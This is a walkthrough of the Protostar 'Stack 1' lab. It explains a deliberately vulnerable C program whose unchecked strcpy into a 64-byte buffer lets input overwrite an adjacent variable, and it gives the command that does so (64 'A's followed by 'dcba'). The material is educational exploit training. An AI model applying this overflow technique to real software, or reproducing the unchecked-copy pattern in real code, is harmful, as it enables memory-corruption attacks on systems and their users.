# Stack 1

## About

This level looks at the concept of modifying variables to specific values in
the program, and how the variables are laid out in memory.

This level is at /opt/protostar/bin/stack1

**Hints**

- If you are unfamiliar with the hexadecimal being displayed, “man ASCII” is your friend.
- Protostar is [little endian](https://en.wikipedia.org/wiki/Endianness)

    #include <stdlib.h>
    #include <unistd.h>
    #include <stdio.h>
    #include <string.h>
    
    int main(int argc, char **argv)
    {
      volatile int modified;
      char buffer[64];
    
      if(argc == 1) {
          errx(1, "please specify an argument\n");
      }
    
      modified = 0;
      strcpy(buffer, argv[1]);
    
      if(modified == 0x61626364) {
          printf("you have correctly got the variable to the right value\n");
      } else {
          printf("Try again, you got 0x%08x\n", modified);
      }
    }

## Program overview

There are two local variables:  and integer number `modified` and a `char` array buffer with space for 64 characters.

    volatile int modified;
      char buffer[64];

This program needs to take two arguments otherwise it throws an error.

    if(argc == 1) {
          errx(1, "please specify an argument\n");

    user@protostar:/opt/protostar/bin$ ./stack1
    stack1: please specify an argument
    
    user@protostar:/opt/protostar/bin$ ./stack1 asdasf
    Try again, you got 0x00000000

Then, `modified` will be set to `0` and apparently never changed again.

    modified = 0;

Then it uses the `strcpy` function.

      strcpy(buffer, argv[1]);

Looking at the `strcpy` man page we can see that the strcpy() function copies the string pointed by our second argument, including the terminating null byte ('\0'), to the buffer pointed to by the destination. When we scroll down we have the "Bugs" section.

    BUGS
           If  the  destination string of a strcpy() is not large enough, then anything might happen.  Overflowing fixed-length string
           buffers is a favorite cracker technique for taking complete control of the machine.  Any time a  program  reads  or  copies
           data  into  a  buffer, the program first needs to check that there's enough space.  This may be unnecessary if you can show
           that overflow is impossible, but be careful: programs can get changed over time, in ways that may make the impossible  pos‐
           sible.

Which means we can overflow the buffer if the destination string is not large enough.

Next the `modified` is compared to `0x61626364`. If it is equal then we solve the challenge.

    if(modified == 0x61626364) {
          printf("you have correctly got the variable to the right value\n");
      } else {
          printf("Try again, you got 0x%08x\n", modified);
      }
    }

This level is similar to the previous one, but the data here is passed in via argv instead of stdin and we need to write the value `0x61626364` to `modified` instead of any non zero value. 

    user@protostar:/opt/protostar/bin$ python -c "print('A' * 65)" | xargs ./stack1
    Try again, you got 0x00000041

The value of the character `A` is written to the memory location reserved for `modified` and the value is written to the least significat byte of `modified` because x86 is a little-endian based system. For example, considering the unsigned hexadecimal number `0x1234`, on a little-endian ordering, the bytes would be arranged `0x34` `0x12`. This meas that we can write 4 bytes past the space allocated for the `buffer` to contain whatever byte value we want.

Using python we can see the ASCII equivalent to the hex value `0x61626364` which is `dcba` .

    Python 3.7.7 (default, Mar 10 2020, 13:18:53) 
    [GCC 9.2.1 20200306] on linux
    Type "help", "copyright", "credits" or "license" for more information.
    >>> x = 0x61626364
    >>> x.to_bytes(4, 'little')
    b'dcba'
    >>>

And we can solve this level.

    user@protostar:/opt/protostar/bin$ python -c "print 'A' * 64 + 'dcba'" | xargs ./stack1
    you have correctly got the variable to the right value